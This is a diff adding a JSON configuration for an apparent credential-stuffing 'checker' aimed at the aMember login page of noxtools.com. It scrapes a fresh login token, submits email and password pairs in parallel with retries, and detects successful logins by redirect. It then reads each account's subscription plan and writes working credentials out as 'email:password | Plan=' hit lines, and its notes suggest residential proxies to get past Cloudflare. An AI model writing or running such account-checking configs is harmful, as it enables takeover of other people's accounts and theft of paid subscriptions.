@@ -1,0 +1,59 @@
+{
+  "id": "noxtools",
+  "name": "Noxtools",
+  "description": "aMember login at /secure/login — login_attempt_id scraped fresh from each GET",
+  "source_capture": "task_20260613_233526",
+  "settings": {
+    "workers": 5,
+    "timeout_seconds": 45,
+    "retry_on_error": 3,
+    "delay_ms": 500
+  },
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+  "variables": {
+    "base_url": "https://noxtools.com",
+    "login_url": "https://noxtools.com/secure/login",
+    "login_referer": "https://noxtools.com/",
+    "member_url": "https://noxtools.com/secure/member"
+  },
+  "steps": [
+    {
+      "id": "login_page",
+      "name": "GET /secure/login — extract login_attempt_id hidden field",
+      "method": "GET",
+      "url": "{{login_url}}"
+    },
+    {
+      "id": "login_post",
+      "name": "POST form login (amember_login, amember_pass, login_attempt_id, _referer)",
+      "method": "POST",
+      "url": "{{login_url}}",
+      "body": "application/x-www-form-urlencoded"
+    },
+    {
+      "id": "member",
+      "name": "GET /secure/member — optional plan from subscription HTML",
+      "method": "GET",
+      "url": "{{member_url}}",
+      "optional": true
+    }
+  ],
+  "plan_labels": {
+    "PAID": { "label": "PAID" },
+    "FREE": { "label": "FREE" },
+    "FREE_TRIAL": { "label": "FREE_TRIAL" },
+    "UNKNOWN": { "label": "UNKNOWN" }
+  },
+  "output": {
+    "hit_line": "{{email}}:{{password}} | Plan={{plan_name}} | Label={{plan_label}}",
+    "console_hit": "[HIT] {{email}} | Plan: {{plan_name}} ({{plan_label}})",
+    "console_fail": "[FAIL] {{email}} | {{reason}}"
+  },
+  "notes": [
+    "login_attempt_id is a fresh Unix timestamp from hidden input — never reuse across accounts.",
+    "POST fields: amember_login, amember_pass, login_attempt_id, _referer.",
+    "Success: redirect away from /secure/login (e.g. /secure/secure/yourwallet).",
+    "Failure: div.am-errors — typically 'The user name or password is incorrect'.",
+    "Cloudflare on login page may need residential proxy."
+  ]
+}
